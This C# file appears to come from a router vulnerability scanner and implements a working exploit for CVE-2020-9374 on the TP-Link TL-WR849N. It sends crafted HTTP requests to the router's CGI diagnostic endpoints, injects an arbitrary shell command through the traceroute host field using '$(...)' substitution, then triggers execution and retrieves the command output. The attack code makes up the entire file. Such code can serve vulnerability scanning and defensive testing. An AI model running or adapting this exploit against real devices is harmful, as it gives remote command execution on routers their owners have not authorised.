namespace RouterScanner.Services.VulHub;

/// <summary>
/// TP LINK TL-WR849N - REMOTE COMMAND EXECUTION
/// <br/><see cref="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9374"/>
/// </summary>
public sealed class CVE_2020_9374 : RouterVulHubBase<CVE_2020_9374>, IRouterVulHub
{
    public string CVE => "CVE-2020-9374";
    public string VulType => "命令执行";
    public string Production => "TP-Link";
    public List<string> Version => ["TL-WR849N"];

    public CVE_2020_9374()
    {
        Payload.Cmd = "pwd";
    }

    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        var res = await Inject(cancellationToken);
        if (!res.Success)
        {
            return res;
        }
        res = await Aceppt(cancellationToken);
        if (!res.Success)
        {
            return res;
        }
        return await Output(cancellationToken);
    }

    private async ValueTask<VulResult> Inject(CancellationToken cancellationToken = default)
    {
        var content = new StringBuilder();
        content.Append("[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\x0d\x0a");
        content.Append("maxHopCount=20\x0d\x0a");
        content.Append("timeout=5\x0d\x0a");
        content.Append("numberOfTries=1\x0d\x0a");
        content.Append($"host=\"$({Payload.Cmd})\"\x0d\x0a");
        content.Append("dataBlockSize=64\x0d\x0a");
        content.Append("X_TP_ConnName=ewan_pppoe\x0d\x0a");
        content.Append("diagnosticsState=Requested\x0d\x0a");
        content.Append("X_TP_HopSeq=0\x0d\x0a");

        var rawText = $"""
            POST /cgi?2 HTTP/1.1
            Host: {Host}
            Authorization: {GetBasicAuth()}
            Content-Type: text/plain
            Referer: http://{Host}/mainFrame.htm

            {content}
            """;
        var resp = await Http.SendAsync(rawText, SSL, cancellationToken).ConfigureAwait(false);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }
        return OK();
    }

    private async ValueTask<VulResult> Aceppt(CancellationToken cancellationToken = default)
    {
        var rawText = $"""
            POST /cgi?7 HTTP/1.1
            Host: {Host}
            Authorization: {GetBasicAuth()}
            Content-Type: text/plain
            Referer: http://{Host}/mainFrame.htm

            [ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\x0d\x0a
            """;
        var resp = await Http.SendAsync(rawText, SSL, cancellationToken).ConfigureAwait(false);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }
        return OK();
    }

    private async ValueTask<VulResult> Output(CancellationToken cancellationToken = default)
    {
        var content = new StringBuilder();
        content.Append("[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\x0d\x0a");
        content.Append("diagnosticsState\x0d\x0a");
        content.Append("X_TP_HopSeq\x0d\x0a");
        content.Append("X_TP_Result\x0d\x0a");

        var rawText = $"""
            POST /cgi?7 HTTP/1.1
            Host: {Host}
            Authorization: {GetBasicAuth()}
            Content-Type: text/plain
            Referer: http://{Host}/mainFrame.htm
            
            {content}
            """;
        var resp = await Http.SendAsync(rawText, SSL, cancellationToken).ConfigureAwait(false);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }
        var filtro = await resp.Content.ReadAsStringAsync(cancellationToken).ConfigureAwait(false);
        var message = filtro.Replace(": Name or service not known", "")
              .Replace("[0,0,0,0,0,0]0", "")
              .Replace("diagnosticsState=", "")
              .Replace("X_TP_HopSeq=0", "")
              .Replace("X_TP_Result=", "");

        return OK(message: message);
    }
}
